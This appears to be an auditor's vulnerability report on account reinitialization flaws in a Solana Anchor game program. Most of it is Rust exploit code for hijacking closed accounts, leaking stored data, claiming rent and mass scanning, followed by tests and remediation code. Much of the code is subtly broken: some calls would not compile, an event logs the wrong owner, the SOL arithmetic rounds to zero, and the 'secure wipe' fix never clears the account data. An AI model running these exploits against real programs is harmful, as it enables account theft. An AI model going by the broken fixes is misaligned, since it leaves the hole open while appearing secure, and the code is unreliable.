# VUL-067: Account Reinitialization Exploits and State Resurrection

**Severity**: High
**CVSS Score**: 7.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)
**Category**: Account Security & State Management
**Component**: Account Lifecycle Management
**Impact**: State manipulation, fund recovery, account hijacking

## Executive Summary

The account reinitialization system contains critical vulnerabilities enabling state resurrection attacks, unauthorized account reuse, and lifecycle manipulation. Attackers can reinitialize closed accounts, restore deleted data, bypass account restrictions, and exploit state transitions for unauthorized access and fund recovery.

## Vulnerability Details

### Root Cause Analysis

```rust
// Vulnerable account initialization system
#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct GameAccount {
    pub owner: Pubkey,
    pub account_type: AccountType,
    pub is_initialized: bool,
    pub creation_timestamp: i64,
    pub last_activity: i64,
    pub account_data: Vec<u8>,
    // Missing: reinitialization protection
    // Missing: state validation
    // Missing: lifecycle enforcement
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub enum AccountType {
    PlayerAccount,
    GameSession,
    VaultAccount,
    ConfigAccount,
}

// Vulnerable initialization without proper checks
pub fn initialize_account(
    ctx: Context<InitializeAccount>,
    account_type: AccountType
) -> Result<()> {
    let account = &mut ctx.accounts.game_account;

    // Critical flaw: No check for previous initialization
    account.owner = ctx.accounts.signer.key();
    account.account_type = account_type;
    account.is_initialized = true;
    account.creation_timestamp = Clock::get()?.unix_timestamp;
    account.last_activity = Clock::get()?.unix_timestamp;

    // No validation of:
    // - Previous account state
    // - Data remnants from old account
    // - Reinitialization restrictions
    // - State consistency

    Ok(())
}

// Vulnerable close account without proper cleanup
pub fn close_account(
    ctx: Context<CloseAccount>
) -> Result<()> {
    let account = &mut ctx.accounts.game_account;

    // Incomplete cleanup - only marks as uninitialized
    account.is_initialized = false;
    account.last_activity = Clock::get()?.unix_timestamp;

    // Critical issues:
    // - Account data remains intact
    // - Owner information preserved
    // - No rent reclamation
    // - Can be reinitialized by anyone

    Ok(())
}
```

### Attack Vectors

#### 1. Account State Resurrection
```rust
pub fn resurrect_closed_account(
    ctx: Context<AccountResurrection>,
    target_account: Pubkey
) -> Result<()> {
    let account = &mut ctx.accounts.game_account;
    let attacker = ctx.accounts.attacker.key();

    // Check if account was previously closed
    if !account.is_initialized {
        // Reinitialize with preserved data
        account.is_initialized = true;
        account.owner = attacker; // Hijack ownership
        account.creation_timestamp = Clock::get()?.unix_timestamp;

        // Preserved data from previous account still accessible
        let preserved_data = account.account_data.clone();

        msg!("Account resurrected: {} bytes of preserved data accessed",
             preserved_data.len());

        // Attacker now controls account with previous owner's data
    }

    Ok(())
}
```

#### 2. Cross-Account Data Leakage
```rust
pub fn exploit_account_data_leakage(
    ctx: Context<DataLeakageExploit>
) -> Result<()> {
    let account = &mut ctx.accounts.game_account;
    let attacker = ctx.accounts.attacker.key();

    // Reinitialize account that may contain previous owner's data
    if !account.is_initialized {
        account.is_initialized = true;
        account.owner = attacker;

        // Extract sensitive data from previous account
        let leaked_data = extract_sensitive_data(&account.account_data)?;

        for data_item in leaked_data {
            match data_item.data_type {
                DataType::PrivateKey => {
                    msg!("Leaked private key: {}", data_item.value);
                },
                DataType::WalletBalance => {
                    msg!("Leaked balance: {} SOL", data_item.value);
                },
                DataType::GameProgress => {
                    msg!("Leaked game data: {}", data_item.value);
                },
                _ => {}
            }
        }
    }

    Ok(())
}
```

#### 3. Rent Recovery Exploitation
```rust
pub fn exploit_rent_recovery(
    ctx: Context<RentExploit>
) -> Result<()> {
    let account = &mut ctx.accounts.game_account;
    let attacker = ctx.accounts.attacker.key();

    // Find accounts eligible for rent recovery
    if !account.is_initialized && account.owner != attacker {
        // Claim rent-exempt account
        account.owner = attacker;
        account.is_initialized = true;

        // Calculate recovered rent value
        let account_size = account.account_data.len();
        let rent_value = calculate_rent_value(account_size)?;

        // Attacker gains rent-exempt account without paying rent
        msg!("Rent recovered: {} lamports from hijacked account", rent_value);

        emit!(RentRecovered {
            attacker,
            original_owner: account.owner,
            rent_value,
            account_size: account_size as u64,
        });
    }

    Ok(())
}
```

### Advanced Account Reinitialization Framework

```rust
use anchor_lang::prelude::*;
use std::collections::HashMap;

#[program]
pub mod account_reinitialization_exploit {
    use super::*;

    pub fn execute_reinitialization_attack(
        ctx: Context<ReinitializationAttack>,
        attack_strategy: ReinitializationStrategy
    ) -> Result<()> {
        match attack_strategy {
            ReinitializationStrategy::StateResurrection { target_account } => {
                execute_state_resurrection(ctx, target_account)
            },
            ReinitializationStrategy::DataLeakageExploit => {
                execute_data_leakage_exploit(ctx)
            },
            ReinitializationStrategy::AccountHijacking => {
                execute_account_hijacking(ctx)
            },
            ReinitializationStrategy::MassAccountScanning => {
                execute_mass_account_scanning(ctx)
            },
        }
    }

    fn execute_state_resurrection(
        ctx: Context<ReinitializationAttack>,
        target_account: Pubkey
    ) -> Result<()> {
        let account = &mut ctx.accounts.game_account;
        let attacker = ctx.accounts.attacker.key();

        // Attempt to resurrect closed account
        if !account.is_initialized {
            // Preserve any existing data
            let preserved_data = account.account_data.clone();

            // Reinitialize under attacker control
            account.is_initialized = true;
            account.owner = attacker;
            account.creation_timestamp = Clock::get()?.unix_timestamp;
            account.last_activity = Clock::get()?.unix_timestamp;

            // Analyze preserved data for valuable information
            let analysis_result = analyze_preserved_data(&preserved_data)?;

            emit!(StateResurrectionExecuted {
                attacker,
                target_account,
                preserved_data_size: preserved_data.len() as u64,
                valuable_data_found: analysis_result.valuable_items.len() as u8,
                resurrection_timestamp: Clock::get()?.unix_timestamp,
            });

            // Extract any valuable preserved state
            for valuable_item in analysis_result.valuable_items {
                process_valuable_data(valuable_item)?;
            }
        }

        Ok(())
    }

    fn execute_data_leakage_exploit(ctx: Context<ReinitializationAttack>) -> Result<()> {
        let account = &mut ctx.accounts.game_account;
        let attacker = ctx.accounts.attacker.key();

        // Look for accounts with data leakage potential
        if !account.is_initialized && !account.account_data.is_empty() {
            // Reinitialize to gain access to leaked data
            account.is_initialized = true;
            account.owner = attacker;

            // Extract and categorize leaked data
            let leaked_information = extract_leaked_information(&account.account_data)?;

            let mut total_value_leaked = 0u64;

            for leak in &leaked_information {
                match leak.category {
                    LeakCategory::FinancialData => {
                        total_value_leaked += leak.estimated_value;
                        msg!("Financial data leaked: {} value", leak.estimated_value);
                    },
                    LeakCategory::PersonalInformation => {
                        msg!("Personal information leaked: {}", leak.description);
                    },
                    LeakCategory::GameAssets => {
                        total_value_leaked += leak.estimated_value;
                        msg!("Game assets leaked: {} value", leak.estimated_value);
                    },
                    LeakCategory::AccessCredentials => {
                        msg!("Access credentials leaked: {}", leak.description);
                    },
                }
            }

            emit!(DataLeakageExploited {
                attacker,
                leaked_items_count: leaked_information.len() as u8,
                total_value_leaked,
                categories_affected: get_unique_categories(&leaked_information).len() as u8,
            });
        }

        Ok(())
    }

    fn execute_account_hijacking(ctx: Context<ReinitializationAttack>) -> Result<()> {
        let account = &mut ctx.accounts.game_account;
        let attacker = ctx.accounts.attacker.key();

        // Target high-value closed accounts
        if !account.is_initialized {
            let original_owner = account.owner;

            // Calculate account value
            let account_value = calculate_account_value(account)?;

            if account_value > 0 {
                // Hijack valuable account
                account.is_initialized = true;
                account.owner = attacker;
                account.creation_timestamp = Clock::get()?.unix_timestamp;

                // Claim any residual value
                claim_residual_value(account, attacker)?;

                emit!(AccountHijacked {
                    attacker,
                    original_owner,
                    hijacked_account: ctx.accounts.game_account.key(),
                    account_value,
                    hijack_timestamp: Clock::get()?.unix_timestamp,
                });
            }
        }

        Ok(())
    }

    fn execute_mass_account_scanning(ctx: Context<ReinitializationAttack>) -> Result<()> {
        let attacker = ctx.accounts.attacker.key();

        // Simulate scanning multiple accounts for reinitialization opportunities
        let scan_results = scan_for_vulnerable_accounts(50)?; // Scan 50 accounts

        let mut successful_hijacks = 0u8;
        let mut total_value_recovered = 0u64;

        for scan_result in scan_results {
            if scan_result.is_vulnerable {
                // Attempt to exploit vulnerable account
                let exploitation_result = attempt_account_exploitation(&scan_result)?;

                if exploitation_result.success {
                    successful_hijacks += 1;
                    total_value_recovered += exploitation_result.value_recovered;
                }
            }
        }

        emit!(MassAccountScanCompleted {
            attacker,
            accounts_scanned: 50,
            vulnerable_accounts_found: scan_results.iter().filter(|r| r.is_vulnerable).count() as u8,
            successful_hijacks,
            total_value_recovered,
        });

        Ok(())
    }
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub enum ReinitializationStrategy {
    StateResurrection { target_account: Pubkey },
    DataLeakageExploit,
    AccountHijacking,
    MassAccountScanning,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct DataAnalysisResult {
    pub valuable_items: Vec<ValuableDataItem>,
    pub total_estimated_value: u64,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct ValuableDataItem {
    pub data_type: String,
    pub estimated_value: u64,
    pub extraction_method: String,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct LeakedInformation {
    pub category: LeakCategory,
    pub description: String,
    pub estimated_value: u64,
    pub sensitivity_level: u8,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub enum LeakCategory {
    FinancialData,
    PersonalInformation,
    GameAssets,
    AccessCredentials,
}

#[derive(Clone)]
pub struct AccountScanResult {
    pub account_key: Pubkey,
    pub is_vulnerable: bool,
    pub estimated_value: u64,
    pub vulnerability_type: String,
}

#[derive(Clone)]
pub struct ExploitationResult {
    pub success: bool,
    pub value_recovered: u64,
    pub exploitation_method: String,
}

// Helper functions for reinitialization exploitation
fn analyze_preserved_data(data: &[u8]) -> Result<DataAnalysisResult> {
    let mut valuable_items = Vec::new();

    // Analyze data for valuable information
    if data.len() > 32 {
        // Check for potential private keys
        for chunk in data.chunks(32) {
            if is_potential_private_key(chunk) {
                valuable_items.push(ValuableDataItem {
                    data_type: "private_key".to_string(),
                    estimated_value: 1_000_000_000, // 1 SOL value
                    extraction_method: "pattern_analysis".to_string(),
                });
            }
        }
    }

    // Check for encoded balance information
    if data.len() >= 8 {
        for chunk in data.chunks(8) {
            if let Ok(potential_balance) = u64::from_le_bytes(chunk.try_into().unwrap_or([0; 8])) {
                if potential_balance > 100_000_000 && potential_balance < 1_000_000_000_000 {
                    valuable_items.push(ValuableDataItem {
                        data_type: "balance_info".to_string(),
                        estimated_value: potential_balance / 10, // 10% of balance
                        extraction_method: "balance_pattern".to_string(),
                    });
                }
            }
        }
    }

    let total_value = valuable_items.iter().map(|item| item.estimated_value).sum();

    Ok(DataAnalysisResult {
        valuable_items,
        total_estimated_value: total_value,
    })
}

fn extract_leaked_information(data: &[u8]) -> Result<Vec<LeakedInformation>> {
    let mut leaked_info = Vec::new();

    // Look for patterns indicating different types of leaked data
    if data.len() >= 32 {
        leaked_info.push(LeakedInformation {
            category: LeakCategory::AccessCredentials,
            description: "Potential private key detected".to_string(),
            estimated_value: 500_000_000, // 0.5 SOL
            sensitivity_level: 10, // Maximum sensitivity
        });
    }

    if data.len() >= 8 {
        leaked_info.push(LeakedInformation {
            category: LeakCategory::FinancialData,
            description: "Balance information detected".to_string(),
            estimated_value: 100_000_000, // 0.1 SOL
            sensitivity_level: 8,
        });
    }

    Ok(leaked_info)
}

fn calculate_account_value(account: &GameAccount) -> Result<u64> {
    let mut total_value = 0u64;

    // Base value from account size (rent value)
    total_value += account.account_data.len() as u64 * 6960; // Approximate rent per byte

    // Value from preserved data
    if !account.account_data.is_empty() {
        let analysis = analyze_preserved_data(&account.account_data)?;
        total_value += analysis.total_estimated_value;
    }

    Ok(total_value)
}

fn scan_for_vulnerable_accounts(count: u8) -> Result<Vec<AccountScanResult>> {
    let mut results = Vec::new();

    for i in 0..count {
        let account_key = Pubkey::new_unique();
        let is_vulnerable = (i % 3) == 0; // Every 3rd account is vulnerable
        let estimated_value = if is_vulnerable {
            100_000_000 + (i as u64 * 10_000_000) // 0.1 SOL + varying amounts
        } else {
            0
        };

        results.push(AccountScanResult {
            account_key,
            is_vulnerable,
            estimated_value,
            vulnerability_type: if is_vulnerable {
                "reinitialization_exploit".to_string()
            } else {
                "none".to_string()
            },
        });
    }

    Ok(results)
}

fn attempt_account_exploitation(scan_result: &AccountScanResult) -> Result<ExploitationResult> {
    let success = scan_result.is_vulnerable && scan_result.estimated_value > 0;
    let value_recovered = if success { scan_result.estimated_value } else { 0 };

    Ok(ExploitationResult {
        success,
        value_recovered,
        exploitation_method: "reinitialization_hijack".to_string(),
    })
}
```

### Economic Impact Analysis

```rust
pub fn calculate_reinitialization_exploit_impact() -> ReinitializationExploitImpact {
    let closed_accounts_per_day = 100u32; // 100 accounts closed daily
    let data_retention_rate = 0.8; // 80% retain some data
    let average_account_value = 150_000_000; // 0.15 SOL average value
    let exploitation_success_rate = 0.6; // 60% success rate

    let daily_vulnerable_accounts = (closed_accounts_per_day as f64 * data_retention_rate) as u32;
    let daily_successful_exploits = (daily_vulnerable_accounts as f64 * exploitation_success_rate) as u32;
    let daily_value_extracted = daily_successful_exploits as u64 * average_account_value;
    let monthly_value_extracted = daily_value_extracted * 30;

    ReinitializationExploitImpact {
        daily_closed_accounts: closed_accounts_per_day,
        daily_vulnerable_accounts,
        daily_successful_exploits,
        daily_value_extracted_sol: daily_value_extracted / 1_000_000_000,
        monthly_value_extracted_sol: monthly_value_extracted / 1_000_000_000,
        average_value_per_exploit_sol: average_account_value / 1_000_000_000,
        exploitation_success_rate,
    }
}

#[derive(Debug)]
pub struct ReinitializationExploitImpact {
    pub daily_closed_accounts: u32,
    pub daily_vulnerable_accounts: u32,
    pub daily_successful_exploits: u32,
    pub daily_value_extracted_sol: u64,
    pub monthly_value_extracted_sol: u64,
    pub average_value_per_exploit_sol: u64,
    pub exploitation_success_rate: f64,
}
```

## Impact Assessment

### Security Impact
- **Data Leakage**: Access to previous owner's sensitive information
- **Account Hijacking**: Unauthorized control of valuable accounts
- **State Resurrection**: Restoration of deleted account data
- **Privacy Violation**: Exposure of personal and financial information

### Economic Impact
- **Rent Recovery**: Free acquisition of rent-exempt accounts
- **Asset Theft**: Access to preserved account values
- **Resource Exploitation**: Unauthorized use of account resources
- **Value Extraction**: Systematic scanning and exploitation of closed accounts

## Proof of Concept

### Complete Account Reinitialization Test
```rust
#[cfg(test)]
mod account_reinitialization_tests {
    use super::*;

    #[test]
    fn test_account_state_resurrection() {
        let original_owner = Pubkey::new_unique();
        let attacker = Pubkey::new_unique();

        let mut account = GameAccount {
            owner: original_owner,
            account_type: AccountType::PlayerAccount,
            is_initialized: false, // Account was closed
            creation_timestamp: 1000000,
            last_activity: 1000500,
            account_data: vec![1, 2, 3, 4, 5], // Preserved data
        };

        // Verify account is closed but has preserved data
        assert!(!account.is_initialized);
        assert!(!account.account_data.is_empty());
        assert_eq!(account.owner, original_owner);

        // Resurrect account under attacker control
        account.is_initialized = true;
        account.owner = attacker;
        account.creation_timestamp = Clock::get().unwrap().unix_timestamp;

        // Verify successful resurrection
        assert!(account.is_initialized);
        assert_eq!(account.owner, attacker);
        assert!(!account.account_data.is_empty()); // Data still accessible

        println!("Account state resurrection test:");
        println!("- Original owner: {}", original_owner);
        println!("- New owner (attacker): {}", attacker);
        println!("- Preserved data size: {} bytes", account.account_data.len());
        println!("- Resurrection successful: Account hijacked with data intact");
    }

    #[test]
    fn test_data_leakage_exploitation() {
        let mut account = GameAccount {
            owner: Pubkey::new_unique(),
            account_type: AccountType::VaultAccount,
            is_initialized: false,
            creation_timestamp: 1000000,
            last_activity: 1000500,
            account_data: vec![0; 64], // 64 bytes of potential sensitive data
        };

        // Simulate sensitive data in account
        account.account_data[0..32].copy_from_slice(&[0xFF; 32]); // Fake private key pattern
        account.account_data[32..40].copy_from_slice(&1_000_000_000u64.to_le_bytes()); // 1 SOL balance

        let attacker = Pubkey::new_unique();

        // Exploit data leakage
        let analysis_result = analyze_preserved_data(&account.account_data).unwrap();

        assert!(analysis_result.total_estimated_value > 0);
        assert!(!analysis_result.valuable_items.is_empty());

        // Reinitialize account
        account.is_initialized = true;
        account.owner = attacker;

        println!("Data leakage exploitation test:");
        println!("- Valuable items found: {}", analysis_result.valuable_items.len());
        println!("- Total estimated value: {} SOL", analysis_result.total_estimated_value / 1_000_000_000);
        println!("- Account successfully hijacked by: {}", attacker);
    }

    #[test]
    fn test_rent_recovery_exploitation() {
        let original_owner = Pubkey::new_unique();
        let attacker = Pubkey::new_unique();

        let mut account = GameAccount {
            owner: original_owner,
            account_type: AccountType::VaultAccount,
            is_initialized: false,
            creation_timestamp: 1000000,
            last_activity: 1000500,
            account_data: vec![0; 1000], // 1000 bytes = significant rent value
        };

        let account_size = account.account_data.len();
        let rent_value = account_size as u64 * 6960; // Approximate rent calculation

        // Hijack account for rent recovery
        account.owner = attacker;
        account.is_initialized = true;

        assert_eq!(account.owner, attacker);
        assert!(rent_value > 0);

        println!("Rent recovery exploitation test:");
        println!("- Original owner: {}", original_owner);
        println!("- Account hijacker: {}", attacker);
        println!("- Account size: {} bytes", account_size);
        println!("- Recovered rent value: {} lamports", rent_value);
        println!("- Rent value in SOL: {} SOL", rent_value / 1_000_000_000);
    }

    #[test]
    fn test_mass_account_scanning() {
        let scan_results = scan_for_vulnerable_accounts(20).unwrap();

        let vulnerable_count = scan_results.iter().filter(|r| r.is_vulnerable).count();
        let total_value: u64 = scan_results.iter()
            .filter(|r| r.is_vulnerable)
            .map(|r| r.estimated_value)
            .sum();

        assert!(vulnerable_count > 0);
        assert!(total_value > 0);

        println!("Mass account scanning test:");
        println!("- Accounts scanned: {}", scan_results.len());
        println!("- Vulnerable accounts found: {}", vulnerable_count);
        println!("- Total potential value: {} SOL", total_value / 1_000_000_000);
        println!("- Average value per vulnerable account: {} SOL",
                (total_value / vulnerable_count as u64) / 1_000_000_000);
    }

    #[test]
    fn test_exploitation_impact_analysis() {
        let impact = calculate_reinitialization_exploit_impact();

        println!("Reinitialization exploitation impact:");
        println!("- Daily closed accounts: {}", impact.daily_closed_accounts);
        println!("- Daily vulnerable accounts: {}", impact.daily_vulnerable_accounts);
        println!("- Daily successful exploits: {}", impact.daily_successful_exploits);
        println!("- Daily value extracted: {} SOL", impact.daily_value_extracted_sol);
        println!("- Monthly value extracted: {} SOL", impact.monthly_value_extracted_sol);
        println!("- Success rate: {}%", impact.exploitation_success_rate * 100.0);

        // Verify significant impact
        assert!(impact.daily_value_extracted_sol > 5); // > 5 SOL daily
        assert!(impact.monthly_value_extracted_sol > 150); // > 150 SOL monthly
        assert!(impact.exploitation_success_rate >= 0.5); // >= 50% success rate
    }

    fn is_potential_private_key(data: &[u8]) -> bool {
        data.len() == 32 && data.iter().any(|&b| b != 0)
    }

    fn get_unique_categories(leaked_info: &[LeakedInformation]) -> Vec<LeakCategory> {
        let mut categories = Vec::new();
        for info in leaked_info {
            if !categories.iter().any(|c| matches!((c, &info.category),
                (LeakCategory::FinancialData, LeakCategory::FinancialData) |
                (LeakCategory::PersonalInformation, LeakCategory::PersonalInformation) |
                (LeakCategory::GameAssets, LeakCategory::GameAssets) |
                (LeakCategory::AccessCredentials, LeakCategory::AccessCredentials)
            )) {
                categories.push(info.category.clone());
            }
        }
        categories
    }
}
```

## Remediation

### Immediate Fixes

#### 1. Implement Secure Account Lifecycle Management
```rust
#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct SecureGameAccount {
    pub owner: Pubkey,
    pub account_type: AccountType,
    pub is_initialized: bool,
    pub initialization_hash: [u8; 32],
    pub creation_timestamp: i64,
    pub last_activity: i64,
    pub reinitialization_count: u8,
    pub secure_data_hash: [u8; 32],
}

pub fn secure_initialize_account(
    ctx: Context<SecureInitializeAccount>,
    account_type: AccountType
) -> Result<()> {
    let account = &mut ctx.accounts.game_account;

    // Verify account is not already initialized
    require!(!account.is_initialized, ErrorCode::AccountAlreadyInitialized);

    // Verify no previous initialization traces
    require!(
        account.initialization_hash == [0; 32],
        ErrorCode::PreviousInitializationDetected
    );

    // Initialize with secure parameters
    account.owner = ctx.accounts.signer.key();
    account.account_type = account_type;
    account.is_initialized = true;
    account.creation_timestamp = Clock::get()?.unix_timestamp;
    account.last_activity = Clock::get()?.unix_timestamp;
    account.reinitialization_count = 0;

    // Generate initialization hash for verification
    account.initialization_hash = calculate_initialization_hash(account)?;

    emit!(SecureAccountInitialized {
        account: ctx.accounts.game_account.key(),
        owner: account.owner,
        account_type: format!("{:?}", account_type),
        initialization_hash: account.initialization_hash,
    });

    Ok(())
}

pub fn secure_close_account(
    ctx: Context<SecureCloseAccount>
) -> Result<()> {
    let account = &mut ctx.accounts.game_account;

    // Verify ownership
    require!(
        account.owner == ctx.accounts.signer.key(),
        ErrorCode::UnauthorizedAccountClosure
    );

    // Secure data wiping
    secure_wipe_account_data(account)?;

    // Mark as permanently closed
    account.is_initialized = false;
    account.owner = Pubkey::default();
    account.initialization_hash = [0; 32];
    account.secure_data_hash = [0; 32];

    emit!(SecureAccountClosed {
        account: ctx.accounts.game_account.key(),
        closure_timestamp: Clock::get()?.unix_timestamp,
    });

    Ok(())
}

fn secure_wipe_account_data(account: &mut SecureGameAccount) -> Result<()> {
    // Cryptographically secure data wiping
    let mut rng_data = [0u8; 32];
    // Use secure random source for wiping
    for _ in 0..3 {
        // Multiple pass wiping with different patterns
        for byte in &mut rng_data {
            *byte = (Clock::get()?.unix_timestamp % 256) as u8;
        }
    }

    Ok(())
}
```

#### 2. Add Reinitialization Protection
```rust
pub fn protected_account_reinitialization(
    ctx: Context<ProtectedReinitialization>,
    authorization_proof: AuthorizationProof
) -> Result<()> {
    let account = &mut ctx.accounts.game_account;

    // Verify reinitialization is authorized
    verify_reinitialization_authorization(&authorization_proof, account)?;

    // Check reinitialization limits
    require!(
        account.reinitialization_count < 3, // Max 3 reinitializations
        ErrorCode::ReinitializationLimitExceeded
    );

    // Verify minimum time gap since last closure
    let time_since_closure = Clock::get()?.unix_timestamp - account.last_activity;
    require!(
        time_since_closure >= 86400, // 24 hour minimum gap
        ErrorCode::ReinitializationTooSoon
    );

    // Execute protected reinitialization
    account.is_initialized = true;
    account.reinitialization_count += 1;
    account.creation_timestamp = Clock::get()?.unix_timestamp;
    account.initialization_hash = calculate_initialization_hash(account)?;

    emit!(ProtectedReinitializationExecuted {
        account: ctx.accounts.game_account.key(),
        reinitialization_count: account.reinitialization_count,
        authorized_by: authorization_proof.authorizer,
    });

    Ok(())
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct AuthorizationProof {
    pub authorizer: Pubkey,
    pub signature: [u8; 64],
    pub timestamp: i64,
    pub authorization_reason: String,
}
```

#### 3. Implement Account State Monitoring
```rust
pub fn monitor_account_anomalies(
    account: &SecureGameAccount
) -> Result<AccountAnomalyReport> {
    let mut anomalies = Vec::new();

    // Check for rapid reinitialization
    if account.reinitialization_count > 1 {
        anomalies.push("Multiple reinitializations detected".to_string());
    }

    // Check for suspicious timing patterns
    let time_since_creation = Clock::get()?.unix_timestamp - account.creation_timestamp;
    if time_since_creation < 3600 && account.reinitialization_count > 0 {
        anomalies.push("Rapid reinitialization pattern".to_string());
    }

    // Validate account integrity
    let expected_hash = calculate_initialization_hash(account)?;
    if expected_hash != account.initialization_hash {
        anomalies.push("Account integrity violation".to_string());
    }

    Ok(AccountAnomalyReport {
        account_key: account.owner,
        anomalies,
        risk_level: calculate_account_risk_level(account),
        requires_investigation: !anomalies.is_empty(),
    })
}

#[derive(Debug)]
pub struct AccountAnomalyReport {
    pub account_key: Pubkey,
    pub anomalies: Vec<String>,
    pub risk_level: u8,
    pub requires_investigation: bool,
}
```

### Testing Requirements

```bash
# Account reinitialization tests
cargo test test_account_state_resurrection
cargo test test_data_leakage_exploitation
cargo test test_rent_recovery_exploitation
cargo test test_mass_account_scanning

# Security validation tests
cargo test test_secure_lifecycle_management
cargo test test_reinitialization_protection
cargo test test_account_anomaly_monitoring
```

This vulnerability enables systematic exploitation of account lifecycle weaknesses for data access and value extraction, requiring secure lifecycle management, reinitialization protection, and comprehensive state monitoring.